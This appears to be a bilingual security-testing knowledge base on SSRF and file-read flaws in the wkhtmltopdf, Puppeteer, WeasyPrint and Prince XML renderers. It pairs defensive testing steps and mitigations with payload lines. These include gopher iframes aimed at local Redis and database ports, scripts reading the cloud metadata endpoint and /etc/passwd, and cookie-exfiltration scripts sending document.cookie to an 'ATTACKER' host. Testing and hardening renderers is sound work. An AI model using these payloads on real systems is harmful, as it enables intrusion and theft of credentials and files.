title.zh: 隔离渲染网络与文件

description.zh: 部署协议和地址限制后重放，确认受控公共资源可用且内网和本地文件访问均被阻断。
description.en: Replay after scheme and destination restrictions to preserve controlled public resources while blocking internal and local-file access.

overview.zh: iframe、图片和其他资源由服务器上的 wkhtmltopdf 进程解析，因此客户端 HTML 注入会转化为服务端网络与文件访问。原集合同时含 HTTP 内网地址和 file: 路径，应分别记录网络请求与 PDF 中真实文件内容。
overview.en: iframe、图片和其他资源由服务器上的 wkhtmltopdf 进程解析，因此客户端 HTML 注入会转化为服务端网络与文件访问。原集合同时含 HTTP 内网地址和 file: 路径，应分别记录网络请求与 PDF 中真实文件内容。

vulnerability.zh: 应用将用户 HTML 直接交给渲染器，且未限制 URL scheme、目标地址、DNS 解析或本地文件访问时，渲染进程会继承服务器网络位置和文件权限。空白 iframe 或渲染超时不能证明目标可读。
vulnerability.en: When an application sends user HTML directly to a renderer without restricting schemes, destinations, DNS resolution, or local file access, the renderer inherits the server's network position and file privileges. A blank iframe or render timeout does not prove that a target was readable.

exploitation.zh: 步骤一用受控外部 HTTP 资源记录渲染器 User-Agent、请求时序和 PDF 嵌入基线；步骤二逐项回放原始内网与 file: 载荷，关联受控回调、服务器连接日志和 PDF 唯一内容；步骤三阻断私网与本地文件后重放，排除客户端预览请求、DNS 扫描或占位图造成的假阳性。
exploitation.en: First use a controlled external HTTP resource to record renderer User-Agent, request timing, and PDF embedding. Replay each original internal and file-scheme input and correlate controlled callbacks, server connection logs, and unique PDF content. Replay after blocking private networks and local files to exclude client previews, DNS scanning, or placeholder images as false positives.

mitigation.zh: 对渲染输入采用资源 allowlist 并拒绝 file、gopher 与未知协议；在独立网络命名空间中阻断回环、链路本地和私网目标，并禁用本地文件访问；以最小权限运行渲染器并对最终 DNS 地址重复校验。
mitigation.en: Apply a resource allowlist and reject file, gopher, and unknown schemes. Block loopback, link-local, and private destinations in an isolated network namespace and disable local-file access. Run the renderer under least privilege and revalidate final DNS addresses.

name.zh: wkhtmltopdf gopher 协议 SSRF

description.zh: 验证 wkhtmltopdf 是否允许 gopher: 资源访问内网服务，并向 Redis、数据库或其他 TCP 端口发送攻击者构造的协议字节。
description.en: Tests whether wkhtmltopdf permits gopher resources to reach internal services and send attacker-crafted protocol bytes to Redis, databases, or other TCP ports.

subCategory.zh: 渲染器非 HTTP 协议 SSRF

prerequisites.zh: 目标 wkhtmltopdf/Qt 网络栈实际支持 gopher:，渲染资源可到达隔离 TCP listener，协议和版本能力已先确认。
prerequisites.en: The target wkhtmltopdf and Qt network stack actually supports gopher:, and render resources can reach an isolated TCP listener, with protocol and version capability confirmed first.

prerequisites.zh: Redis/数据库目标替换为只记录原始字节且不执行命令的自有 TCP sink，使用唯一 token 和一次短连接；flushall 等破坏行不执行。
prerequisites.en: Redis and database targets are replaced by an owned TCP sink that records raw bytes without executing commands, using a unique token and one short connection; destructive lines such as flushall are not executed.

title.zh: wkhtmltopdf gopher:// SSRF

description.zh: wkhtmltopdf gopher:// SSRF包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: wkhtmltopdf gopher:// SSRF contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是 wkhtmltopdf 进程解析 gopher URI 并向隔离 sink 发送与编码载荷一致的 token 字节，连接源、任务和字节流相互对应。 假阳性边界：gopher 字符串被接受、Qt 报不支持、DNS/连接尝试无字节、TCP sink 收到扫描流量、PDF 错误或 Redis 命令语法存在均不是协议 SSRF。
analysis.en: Positive evidence requires the wkhtmltopdf process to parse the gopher URI and send token bytes matching the encoded payload to the isolated sink, correlating connection source, job, and byte stream. False-positive boundary: Accepted gopher text, an unsupported-scheme error, DNS or connection attempts without bytes, scanner traffic at the sink, PDF errors, or valid Redis command syntax does not prove protocol SSRF.

opsecTips.zh: gopher 测试只发送无害 token，禁止 INFO/flushall/数据库协议和真实端口；出现非测试字节、服务响应、持久连接、端口扫描或渲染异常时停止。
opsecTips.en: Gopher testing sends a harmless token only and forbids INFO, flushall, database protocols, and real ports; stop on nontest bytes, service responses, persistent connections, port scanning, or render anomalies.

opsecTips.zh: 关闭 TCP sink 和连接，删除 HTML/PDF/token，清理渲染任务与网络日志，重启 renderer 并确认无延迟重试。
opsecTips.en: Close the TCP sink and connections, delete HTML, PDF, and tokens, clear render jobs and network logs, restart the renderer, and confirm no delayed retries.

title.zh: 部署字节记录模拟服务

description.zh: 在隔离网段准备无状态 TCP 服务，记录连接来源、端口和完整接收字节。
description.en: Prepare a stateless TCP service in an isolated network and record connection source, port, and complete received bytes.

title.zh: 回放 gopher 协议字节

description.zh: 提交原始 gopher 资源并比较 URL 解码结果与模拟服务实际收到的协议内容。
description.en: Submit the original gopher resources and compare URL-decoded data with protocol content received by the mock service.

attackChain.payload:
<iframe src="gopher://127.0.0.1:6379/_INFO%0d%0a"></iframe>
<iframe src="gopher://127.0.0.1:6379/_*1%0d%0a%0d%0aINFO%0d%0a"></iframe>
<iframe src="gopher://127.0.0.1:3306/_"></iframe>
<iframe src="gopher://127.0.0.1:27017/_"></iframe>
<iframe src="gopher://127.0.0.1:5432/_"></iframe>
<iframe src="gopher://127.0.0.1:9000/_"></iframe>

title.zh: 限制协议与网络出口

description.zh: 仅允许公共 HTTP/HTTPS 并阻断内网后重放，确认正常渲染保留且模拟器不再收到连接。
description.en: Replay after allowing only public HTTP and HTTPS and blocking internal egress, preserving normal rendering without mock-service connections.

overview.zh: gopher: 载荷将 SSRF 从 HTTP GET 扩展到可控 TCP 字节，原集合涉及 Redis 与多个数据库端口。测试应使用隔离模拟服务，尤其不能把 flushall 等破坏性片段发送到真实共享 Redis。
overview.en: Gopher inputs extend SSRF from HTTP GET to attacker-controlled TCP bytes, and the source covers Redis and several database ports. Testing must use isolated mock services, especially because destructive fragments such as flushall must never be sent to a shared Redis instance.

vulnerability.zh: 若渲染器或其 URL 库允许非业务协议，且网络层可到达内网服务，攻击者可以把 HTML 资源 URL 变成任意协议客户端。端口可连接或渲染失败只表示网络行为，只有模拟服务收到预期解码字节才证明协议级 SSRF。
vulnerability.en: If the renderer or URL library permits nonbusiness schemes and can reach internal services, an HTML resource URL can become an arbitrary protocol client. A reachable port or failed render shows only network behavior; protocol-level SSRF requires the mock service to receive the expected decoded bytes.

exploitation.zh: 步骤一在隔离网络启动只记录字节的 Redis/TCP 模拟器并建立普通 HTTP 资源基线；步骤二回放原始 gopher 集合，保存渲染器连接、URL 解码后字节和模拟器会话；步骤三禁用 gopher 并阻断内网网段后复测，排除 DNS 探测、端口扫描或渲染超时造成的假阳性。
exploitation.en: First start a byte-recording Redis or TCP simulator in an isolated network and establish a normal HTTP-resource baseline. Replay the original gopher set and preserve renderer connections, URL-decoded bytes, and simulator sessions. Disable gopher and block internal ranges before replaying to exclude DNS probes, port scans, or render timeouts as false positives.

mitigation.zh: 在解析器入口只允许 http/https 且拒绝协议混淆；在网络层阻断渲染容器到私网、回环和管理端口；对 URL 解码后目标再次校验，并以只读、无凭据的独立渲染沙箱运行。
mitigation.en: Allow only HTTP and HTTPS at parser entry and reject scheme confusion. Block renderer-container access to private, loopback, and management ports at the network layer. Revalidate destinations after URL decoding and run rendering in an isolated read-only sandbox without credentials.

name.zh: Puppeteer HTTP 资源读取边界

description.zh: 归并 fetch 与同步 XMLHttpRequest 的回环及元数据地址变体，验证无头 Chromium 是否代表渲染服务请求 HTTP 资源并把响应交给页面脚本。
description.en: Groups fetch and synchronous XML Http Request variants for loopback and metadata addresses to test whether headless Chromium requests HTTP resources on behalf of the renderer and exposes responses to page script.

subCategory.zh: 无头浏览器 HTTP 资源访问

prerequisites.zh: 真实回环和云元数据地址在提交前改写为两个隔离的固定标记端点
prerequisites.en: Real loopback and cloud-metadata addresses are rewritten before submission to two isolated fixed-marker endpoints.

prerequisites.zh: 能够同时记录渲染请求、Chromium 网络事件和页面 title 结果，并禁用重定向与外部出口
prerequisites.en: Renderer requests, Chromium network events, and the resulting page title can be recorded while redirects and external egress are disabled.

title.zh: HTTP Fetch 与 XHR 变体

description.zh: 保留原行用于来源追踪；实际测试必须把两个地址替换为隔离标记端点，并将响应限制为短随机常量。
description.en: The original lines are retained for provenance; replace both addresses with isolated marker endpoints during testing and limit responses to short random constants.

analysis.zh: 只有应用发起的 Chromium 请求取得模拟响应，且页面输出出现同一随机标记，才证明 HTTP 响应可读 SSRF。连接失败、CORS 拒绝或空 title 只能说明某一环节被阻断。
analysis.en: Readable-response SSRF is proven only when the application-origin Chromium request receives the simulated response and the same random marker appears in page output. A failed connection, CORS rejection, or empty title shows a blocked stage only.

opsecTips.zh: 模拟端点只返回短随机标记，禁止凭证、实例数据、重定向和二次资源
opsecTips.en: Simulator endpoints return only short random markers, with no credentials, instance data, redirects, or secondary resources.

opsecTips.zh: 每个变体只渲染一次并设置短超时，完成后销毁浏览器 Profile、网络日志和标记
opsecTips.en: Render each variant once with a short timeout, then destroy the browser profile, network logs, and tokens.

title.zh: 隔离网络并建立基线
title.en: Isolate networking and establish a baseline

description.zh: 确认普通页面不产生出站请求，并为两个模拟目标配置独立令牌。
description.en: Confirm an ordinary page makes no outbound request and assign separate tokens to the two simulators.

title.zh: 改写目标后逐条渲染

description.zh: 每次只测试一个 API 和一个模拟目标，保存页面与网络跟踪。
description.en: Test one API and one simulated destination at a time and preserve page and network traces.

attackChain.payload:
<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>document.title=t)</script>
<script>fetch('http://127.0.0.1/').then(r=>r.text()).then(t=>document.title=t)</script>
<script>var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1/',false);x.send();document.title=x.responseText</script>
<script>var x=new XMLHttpRequest();x.open('GET','http://169.254.169.254/latest/meta-data/',false);x.send();document.title=x.responseText</script>

title.zh: 关联响应读取证据

description.zh: 匹配请求令牌、响应体和 title，区分可达性与内容读取。
description.en: Match request token, response body, and title and distinguish reachability from content read.

title.zh: 收紧出口并回归

description.zh: 修复后确认批准公网目标仍可用，而模拟内部目标在发包前被拒绝。
description.en: After remediation preserve approved public targets while rejecting simulated internal destinations before a packet is sent.

overview.zh: Puppeteer 驱动的 Chromium 会在页面上下文执行 fetch 或 XHR。若渲染器网络可达内部服务，页面脚本可能读取响应并通过 title 等输出通道交回调用方。
overview.en: Puppeteer-driven Chromium executes fetch or XHR in page context. If renderer networking reaches internal services, page script may read the response and return it through an output channel such as the title.

vulnerability.zh: 问题同时需要不可信脚本执行、目标地址可达和响应可读。只观察 DNS、连接尝试、CORS 错误或 title 中的输入回显，不足以证明内部响应泄露。
vulnerability.en: The issue requires untrusted script execution, destination reachability, and a readable response. DNS, a connection attempt, a CORS error, or reflected input in the title does not prove disclosure of an internal response.

exploitation.zh: 先用禁止网络的普通页面建立基线，再分别提交 fetch 与 XHR 到带不同令牌的模拟端点。阳性要求渲染请求、Chromium 请求、模拟响应和 title 中相同令牌完整关联。
exploitation.en: Establish a network-disabled ordinary-page baseline, then submit fetch and XHR separately to simulators with distinct tokens. A positive correlates the render request, Chromium request, simulator response, and the same token in the title.

mitigation.zh: 在解析后和每次跳转前执行地址策略，阻断回环、链路本地、私网及保留网段；禁用不需要的脚本，并让渲染进程运行在无内部路由的独立网络。
mitigation.en: Apply destination policy after resolution and before every redirect, blocking loopback, link-local, private, and reserved ranges; disable unnecessary script and run the renderer on a network without internal routes.

name.zh: Puppeteer 本地 File URI 读取边界

description.zh: 归并 fetch 与同步 XMLHttpRequest 的 file URI 变体，验证无头 Chromium 的页面来源和启动策略是否允许读取渲染主机文件。
description.en: Groups fetch and synchronous XML Http Request file-URI variants to test whether headless Chromium page origin and launch policy permit reads from renderer-host files.

subCategory.zh: 无头浏览器本地文件读取

prerequisites.zh: 原 `/etc/passwd` 路径在执行前替换为渲染沙箱内只含随机标记的临时文件
prerequisites.en: The original /etc/passwd path is replaced before execution with a temporary marker-only file inside the rendering sandbox.

prerequisites.zh: Chromium 使用临时 Profile 和最小文件权限，文件审计可区分 URI 解析、打开与内容读取
prerequisites.en: Chromium uses a temporary profile and minimal file permissions, with file audit distinguishing URI parsing, open, and content read.

title.zh: File Fetch 与 XHR 变体

description.zh: 实际验证仅指向临时 marker 文件；保留原命令用于追溯，不读取系统账户文件。
description.en: During validation point only to the temporary marker file; the original command remains for provenance and the system account file is not read.

analysis.zh: 浏览器文件读取审计和返回通道中的同一标记共同构成阳性。file URI 出现在 DOM、控制台错误或请求对象中只证明输入被解析，不能证明宿主文件泄露。
analysis.en: Browser file-read audit plus the same marker in the return channel constitutes a positive. A file URI in the DOM, console error, or request object proves parsing only, not host-file disclosure.

opsecTips.zh: 绝不指向系统文件、密钥或宿主挂载，只使用自动销毁的单行 marker 文件
opsecTips.en: Never target system files, keys, or host mounts; use only an automatically destroyed one-line marker file.

opsecTips.zh: 测试进程无管理员权限、无网络并设置文件读取配额，首次成功读取后立即停止
opsecTips.en: Run without administrator rights or networking, enforce a file-read quota, and stop after the first successful read.

title.zh: 创建无敏感标记文件

description.zh: 在临时挂载写入一次性随机值并开启浏览器进程文件审计。
description.en: Write a one-time random value in a temporary mount and enable file auditing for the browser process.

title.zh: 改写路径并测试 API
title.en: Rewrite the path and test the APIs

description.zh: 逐一运行 fetch 与 XHR，对每次渲染使用新 Profile。
description.en: Run fetch and XHR one at a time using a fresh profile for every render.

attackChain.payload:
<script>fetch('file:///etc/passwd').then(r=>r.text()).then(t=>document.title=t)</script>
<script>var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();document.title=x.responseText</script>

title.zh: 验证文件内容链路

description.zh: 关联文件打开、读取字节和 title 标记，排除仅路径解析。
description.en: Correlate file open, bytes read, and title marker and exclude path parsing alone.

title.zh: 撤销文件权限并回归

description.zh: 修复后确认 marker 在打开前被拒绝且普通内联页面仍可渲染。
description.en: After remediation confirm marker access is rejected before open while ordinary inline pages still render.

overview.zh: file URI 是否可由 fetch/XHR 读取取决于文档来源、Chromium 安全策略、启动参数和沙箱文件权限。两条原行是同一边界的 API 变体。
overview.en: Whether fetch or XHR can read a file URI depends on document origin, Chromium security policy, launch flags, and sandbox filesystem permissions. The two source lines are API variants of one boundary.

vulnerability.zh: 若攻击者控制渲染页面脚本且浏览器可读取宿主文件，内容可能进入 title 或其他返回通道。错误中出现路径、请求被创建或文件存在性信号均不等于读取内容。
vulnerability.en: If an attacker controls renderer-page script and the browser can read host files, content may enter the title or another return channel. A path in an error, creation of a request, or a file-existence signal does not equal a content read.

exploitation.zh: 分别用不存在文件和随机 marker 文件执行两种 API，对照文件审计与 title。阳性要求浏览器进程实际读取 marker 文件，且同一随机值出现在返回结果。
exploitation.en: Run both APIs against a missing file and a random marker file and compare file audit with the title. A positive requires the browser process to read the marker file and the same random value to appear in returned output.

mitigation.zh: 禁用本地文件访问启动选项，把渲染器放入只含工作目录的只读沙箱，并在输入规范化后拒绝 file scheme；避免把任意页面输出直接返回。
mitigation.en: Disable local-file access launch options, place the renderer in a read-only sandbox containing only its work directory, reject the file scheme after normalization, and avoid returning arbitrary page output.

name.zh: Puppeteer 页面 Cookie 出站通道

description.zh: 归并 sendBeacon、顶层导航和 Image 三种出站方式，验证无头浏览器执行不可信脚本时非 HttpOnly 测试 Cookie 是否可离开页面。
description.en: Groups send Beacon, top-level navigation, and Image egress methods to test whether a non-HttpOnly test cookie can leave the page when a headless browser executes untrusted script.

prerequisites.zh: ATTACKER 改为隔离的单次请求捕获器，页面只设置无权限随机测试 Cookie
prerequisites.en: ATTACKER is replaced with an isolated single-request collector and the page sets only a random unprivileged test cookie.

prerequisites.zh: 同时准备 HttpOnly 对照 Cookie，并能记录浏览器请求方法、目标和来源渲染任务
prerequisites.en: An HttpOnly control cookie is prepared and browser request method, destination, and originating render job can be recorded.

title.zh: Beacon、导航与图片出站

description.zh: 实际测试把 ATTACKER 替换为隔离捕获器，且 document.cookie 只能包含随机测试值；三行逐一执行。
description.en: Replace ATTACKER with the isolated collector and ensure document.cookie contains only random test data; execute the three lines separately.

analysis.zh: 捕获器收到与当前任务绑定的随机非 HttpOnly Cookie 才证明数据出站。仅产生请求、改变 location、加载失败或收到无 Cookie 流量是阴性；HttpOnly 对照用于限定脚本可读边界。
analysis.en: Data egress is proven only when the collector receives the random non-HttpOnly cookie bound to the current job. A request alone, location change, load failure, or cookie-free traffic is negative; the HttpOnly control bounds script readability.

opsecTips.zh: 捕获器只保存随机值和任务 ID，禁止真实会话 Cookie、请求体转储和重定向
opsecTips.en: The collector stores only the random value and job ID, with no real session cookies, body dumps, or redirects.

opsecTips.zh: 每次运行使用全新 Profile 和 Cookie jar，捕获首个请求后立即关闭网络与浏览器
opsecTips.en: Use a fresh profile and cookie jar for every run and close networking and the browser after the first captured request.

title.zh: 建立测试 Cookie 对照

description.zh: 创建随机普通 Cookie 与随机 HttpOnly Cookie，并确认正常页面无出站。
description.en: Create random ordinary and HttpOnly cookies and confirm an ordinary page has no egress.

title.zh: 逐通道提交页面
title.en: Submit one channel at a time

description.zh: 为三种 API 分配不同捕获路径并分别渲染一次。
description.en: Assign separate collector paths to the three APIs and render each once.

attackChain.payload:
<script>navigator.sendBeacon('http://ATTACKER/',document.cookie)</script>
<script>window.location='http://ATTACKER/?c='+document.cookie</script>
<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>

title.zh: 关联 Cookie 与任务

description.zh: 匹配随机值、请求时间、浏览器进程和渲染 ID，验证 HttpOnly 缺失。
description.en: Match random value, request time, browser process, and render ID and verify the HttpOnly value is absent.

title.zh: 隔离会话后回归

description.zh: 修复后确认三种通道均不能携带测试 Cookie，同时普通渲染保持正常。
description.en: After remediation confirm none of the channels carries the test cookie while ordinary rendering remains functional.

overview.zh: 三种 DOM API 都可产生浏览器侧请求，但传输位置和导航副作用不同。它们属于脚本执行后的数据出站，不是服务端根据 URL 抓取资源的 SSRF。
overview.en: All three DOM APIs can produce browser-side requests, with different transport locations and navigation side effects. They are data egress after script execution, not SSRF caused by a server fetching a supplied URL.

vulnerability.zh: 当不可信 HTML 在带业务 Cookie 的渲染上下文运行，非 HttpOnly 值可被脚本读取并发送。捕获器只收到空请求、固定 URL 或浏览器预检并不能证明 Cookie 泄露。
vulnerability.en: When untrusted HTML runs in a rendering context carrying business cookies, non-HttpOnly values can be read and sent by script. An empty request, fixed URL, or browser preflight at the collector does not prove cookie disclosure.

exploitation.zh: 为每个 API 设置不同随机 Cookie 和捕获路径，逐条渲染并比较 HttpOnly 对照。阳性要求捕获器收到当前任务的非 HttpOnly 值，且 HttpOnly 值始终缺失。
exploitation.en: Assign a distinct random cookie and collector path to each API, render one at a time, and compare the HttpOnly control. A positive requires the current job's non-HttpOnly value at the collector while the HttpOnly value remains absent.

mitigation.zh: 在独立无会话来源中渲染，禁用不需要的 JavaScript，应用严格 CSP 与出口允许列表，并把敏感 Cookie 设置 HttpOnly、Secure 和适当 SameSite。
mitigation.en: Render in an isolated sessionless origin, disable unnecessary Java Script, apply strict CSP and egress allowlisting, and mark sensitive cookies HttpOnly, Secure, and with an appropriate SameSite policy.

name.zh: WeasyPrint HTTP 子资源获取边界

description.zh: 归并外部样式表和 SVG image 两种声明式 HTTP 子资源，验证 WeasyPrint URL fetcher 是否可达渲染服务内部地址。
description.en: Groups external stylesheet and SVG image declarative HTTP subresources to test whether the Weasy Print URL fetcher can reach renderer-internal destinations.

subCategory.zh: 文档渲染 HTTP 子资源

prerequisites.zh: 127.0.0.1 在渲染前改为隔离的 marker 服务，且无真实内部路由
prerequisites.en: 127.0.0.1 is replaced before rendering with an isolated marker service and no real internal route is available.

prerequisites.zh: 能够记录 WeasyPrint 版本、自定义 URL fetcher 决策和模拟端点首包
prerequisites.en: The Weasy Print version, custom URL-fetcher decisions, and simulator first packets can be recorded.

title.zh: CSS 与 SVG HTTP 子资源

description.zh: 实际渲染将地址替换为两个带独立令牌的模拟路径，响应仅为最小有效 CSS 或图片。
description.en: During rendering replace the address with two separately tokenized simulator paths returning only minimal valid CSS or image content.

analysis.zh: 来自 WeasyPrint 进程并携带当前 marker 的 HTTP 首包证明服务端资源访问。渲染警告、空白图片、DNS 或客户端查看 PDF 时的请求都不是同等证据。
analysis.en: 来自 Weasy Print 进程并携带当前 marker 的 HTTP 首包证明服务端资源访问。渲染警告、空白图片、DNS 或客户端查看 PDF 时的请求都不是同等证据。

opsecTips.zh: 模拟服务无重定向、无认证并在首个请求后关闭，不返回任何内部数据
opsecTips.en: The simulator has no redirects or authentication, closes after its first request, and returns no internal data.

opsecTips.zh: 渲染容器使用一次性网络命名空间、短超时和严格响应体大小上限
opsecTips.en: Use a disposable network namespace, short timeout, and strict response-size cap for the rendering container.

title.zh: 记录 Fetcher 基线

description.zh: 保存版本、允许 scheme 和无资源文档的零请求结果。
description.en: Preserve the version, allowed schemes, and zero-request result for a resource-free document.

title.zh: 逐资源渲染 Marker

description.zh: 为 CSS 与 SVG 分配不同令牌并分别生成文档。
description.en: Assign separate tokens to CSS and SVG and generate each document separately.

attackChain.payload:
<link rel="stylesheet" href="http://127.0.0.1/">
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1/"/></svg>

title.zh: 关联服务端请求

description.zh: 匹配渲染 ID、首包、User-Agent 和令牌，排除浏览器客户端流量。
description.en: Match render ID, first packet, user agent, and token and exclude client-browser traffic.

title.zh: 限制 Fetcher 后回归

description.zh: 确认批准 CDN 资源可用，模拟内部地址在连接前失败。
description.en: Confirm approved CDN resources remain available and the simulated internal address fails before connection.

overview.zh: WeasyPrint 会通过 URL fetcher 解析 HTML/CSS/SVG 引用。link 和 image 是同一服务端取资源边界的不同格式入口。
overview.en: Weasy Print 会通过 URL fetcher 解析 HTML/CSS/SVG 引用。link 和 image 是同一服务端取资源边界的不同格式入口。

vulnerability.zh: 若攻击者可控制资源 URL 且 fetcher 未限制解析后的地址，渲染进程可能访问内部 HTTP 服务。输出中仅出现 URL、资源渲染失败或 DNS 查询并不证明请求到达。
vulnerability.en: If an attacker controls resource URLs and the fetcher does not restrict resolved destinations, the renderer may access internal HTTP services. A URL in output, failed resource rendering, or DNS lookup alone does not prove the request arrived.

exploitation.zh: 先渲染无外部资源基线，再分别提交 CSS 和 SVG 变体到不同 marker 路径。阳性要求模拟端点首包与对应渲染任务关联；是否呈现资源作为第二层证据。
exploitation.en: Render a no-external-resource baseline, then submit CSS and SVG variants to separate marker paths. A positive correlates the simulator first packet with the render job; visible resource rendering is a second evidence layer.

mitigation.zh: 用自定义 URL fetcher 仅允许批准 scheme、域名和解析地址，在重定向后重复校验；渲染容器网络默认拒绝内部及链路本地路由。
mitigation.en: Use a custom URL fetcher that permits only approved schemes, hosts, and resolved addresses and revalidates after redirects; deny internal and link-local routes by default in the rendering container.

name.zh: WeasyPrint File URI 子资源边界

description.zh: 归并样式表与 SVG image 的 file URI 变体，验证 WeasyPrint URL fetcher 和渲染身份对本地文件的访问范围。
description.en: Groups stylesheet and SVG image file-URI variants to test the local-file reach of the Weasy Print URL fetcher and rendering identity.

subCategory.zh: 文档渲染本地文件访问

prerequisites.zh: 原系统路径替换为渲染沙箱中分别包含最小 CSS 和图片的临时 marker 文件
prerequisites.en: The original system path is replaced with temporary marker files containing minimal CSS and image data inside the rendering sandbox.

prerequisites.zh: 渲染身份无宿主挂载权限，文件审计覆盖 URL fetcher 的 open/read 事件
prerequisites.en: The rendering identity has no host-mount permission and file audit covers URL-fetcher open and read events.

title.zh: CSS 与 SVG File URI

description.zh: 执行前将两条路径分别改为最小 marker.css 和 marker.png，禁止读取 `/etc/passwd`。
description.en: Before execution change the two paths to minimal marker.css and marker.png respectively; do not read /etc/passwd.

analysis.zh: 阳性需要 WeasyPrint 进程读取临时 marker 并在输出中产生可解释效果。URI 被解析、文件 open 失败或解析器报告格式错误只能证明到达某层边界。
analysis.en: A positive requires the Weasy Print process to read the temporary marker and produce an attributable output effect. URI parsing, a failed file open, or a format error proves only that a particular boundary was reached.

opsecTips.zh: 只挂载自动生成的 marker 目录，绝不暴露 `/etc`、用户目录、密钥或应用配置
opsecTips.en: Mount only the generated marker directory and never expose /etc, user directories, keys, or application configuration.

opsecTips.zh: 限制单次读取大小和文件数量，渲染完成后卸载目录并销毁输出
opsecTips.en: Limit bytes and file count per run, then unmount the directory and destroy output after rendering.

title.zh: 准备类型正确的 Marker

description.zh: 创建最小 CSS 与图片文件并记录哈希，另设不存在路径。
description.en: Create minimal CSS and image files, record their hashes, and define a missing path.

title.zh: 改写 URI 后逐条渲染

description.zh: 每次只引用一种 marker，保存文件审计和输出哈希。
description.en: Reference one marker type per run and preserve file audit and output hash.

attackChain.payload:
<link rel="stylesheet" href="file:///etc/passwd">
<svg xmlns="http://www.w3.org/2000/svg"><image href="file:///etc/passwd"/></svg>

title.zh: 确认读取而非存在性

description.zh: 要求读取字节和文档效果同时出现，并与缺失文件对照。
description.en: Require both bytes read and document effect and compare with the missing-file control.

title.zh: 限制资源根并清理
title.en: Restrict the asset root and clean up

description.zh: 修复后保留批准资产，拒绝目录外 marker，再删除临时文件。
description.en: After remediation preserve approved assets, reject the out-of-root marker, and delete temporary files.

overview.zh: WeasyPrint 默认取资源机制可能处理 file URI，而能否读到内容取决于 fetcher 定制、base URL 和操作系统权限。CSS 与 SVG 只是内容类型不同。
overview.en: Weasy Print resource retrieval may handle file UR Is, while successful content reads depend on fetcher customization, base URL, and operating-system permissions. CSS and SVG differ only by content type here.

vulnerability.zh: 不可信文档若能引用渲染主机文件，可能通过呈现结果或错误侧信道暴露内容。路径被接受、文件存在或格式解析错误不等于内容已泄露。
vulnerability.en: If an untrusted document can reference renderer-host files, content may leak through rendered output or an error side channel. Path acceptance, file existence, or a format error does not equal content disclosure.

exploitation.zh: 使用不存在文件、有效 marker.css 与 marker.png 做对照，逐条渲染并关联 open/read 和输出变化。只在 marker 内容影响文档且读取事件匹配时记录内容读取。
exploitation.en: Use a missing file, valid marker.css, and marker.png as controls, render one at a time, and correlate open/read events with output changes. Record a content read only when marker data affects the document and the read event matches.

mitigation.zh: 自定义 fetcher 拒绝 file scheme 或仅允许规范化后的专用资源根目录，同时以无宿主挂载的低权限容器运行渲染器。
mitigation.en: Reject the file scheme in a custom fetcher or allow only a canonical dedicated asset root, and run the renderer in a low-privilege container without host mounts.

name.zh: Prince XML 附件与对象资源 SSRF
name.en: Prince XML Attachment and Object Resource SSRF

description.zh: 验证 Prince XML 渲染用户标记时是否通过 attachment 或 object 资源从服务器读取回环地址与本地文件。
description.en: Tests whether Prince XML rendering of user markup retrieves loopback resources or local files through attachment or object elements from the server environment.

subCategory.zh: Prince XML 资源与附件加载
subCategory.en: Prince XML Resource and Attachment Loading

prerequisites.zh: 用户标记由服务器 Prince XML 处理，attachment、object 与 file/http 资源开关、许可证版本和 worker 权限已确认。
prerequisites.en: 用户标记由服务器 Prince XML 处理，attachment、object 与 file/http 资源开关、许可证版本和 worker 权限已确认。

prerequisites.zh: attachment/object 仅引用自有空 HTTP marker 或 Prince 沙箱文件，记录 Prince 日志、PDF 附件/对象表、文件审计与任务 token。
prerequisites.en: Attachment and object references use only an owned empty HTTP marker or Prince-sandbox file, recording Prince logs, PDF attachment or object tables, file audit, and job tokens.

title.zh: Prince XML SSRF

execution.command:
<link rel="attachment" src="file:///etc/passwd">
<link rel="attachment" src="http://127.0.0.1/">
<object data="file:///etc/passwd">
<object data="http://127.0.0.1/">

description.zh: Prince XML SSRF包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Prince XML SSRF contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性证据是 Prince 进程按特定 attachment/object 指令访问 marker 资源并将其作为附件或对象嵌入 PDF，源连接、任务与 PDF 结构一致。 假阳性边界：标签被保留、PDF 只有 URI 注释、附件列表为空、资源错误、客户端阅读器后续访问 URL、路径文字或 DNS 查询均不是服务端 SSRF。
analysis.en: 阳性证据是 Prince 进程按特定 attachment/object 指令访问 marker 资源并将其作为附件或对象嵌入 PDF，源连接、任务与 PDF 结构一致。 假阳性边界：标签被保留、PDF 只有 URI 注释、附件列表为空、资源错误、客户端阅读器后续访问 URL、路径文字或 DNS 查询均不是服务端 SSRF。

opsecTips.zh: Prince XML 测试不附加真实文件或访问内网；出现非 marker 附件、认证信息、公共请求、大对象嵌入、文件写入或 worker 异常时停止。
opsecTips.en: Prince XML testing never attaches real files or accesses internal networks; stop on non-marker attachments, credentials, public requests, large embedded objects, file writes, or worker anomalies.

opsecTips.zh: 删除 HTML/PDF/附件/marker 和 Prince 临时目录，关闭 endpoint，清理渲染/字体/对象缓存和任务日志并重启 worker。
opsecTips.en: Delete HTML, PDF, attachments, markers, and Prince temporary directories, close endpoints, clear rendering, font, and object caches plus job logs, and restart workers.

title.zh: 固定 Prince 附件基线

description.zh: 以受控公共文件记录渲染器请求来源、附件元数据、内容哈希和 PDF 结构。
description.en: Use a controlled public file to record renderer request origin, attachment metadata, content hash, and PDF structure.

title.zh: 测试内部对象与文件

description.zh: 回放原始 attachment/object 集合并关联模拟服务、文件 Canary 和生成 PDF。
description.en: Replay the original attachment and object set and correlate mock services, file canaries, and the generated PDF.

attackChain.payload:
<link rel="attachment" src="file:///etc/passwd">
<link rel="attachment" src="http://127.0.0.1/">
<object data="file:///etc/passwd">
<object data="http://127.0.0.1/">

title.zh: 限制 Prince URL 访问

description.zh: 部署协议、地址和文件策略后重放，确认授权附件保留且内部资源不再进入渲染结果。
description.en: Replay after scheme, address, and file policies to preserve authorized attachments while excluding internal resources from output.

overview.zh: 原命令利用 Prince 支持的附件和对象引用，测试生成 PDF 时是否主动拉取 URL 或嵌入本地文件。链接文本本身不构成 SSRF，必须证明 Prince 进程而非用户浏览器发起请求，并确认资源进入输出或服务日志。
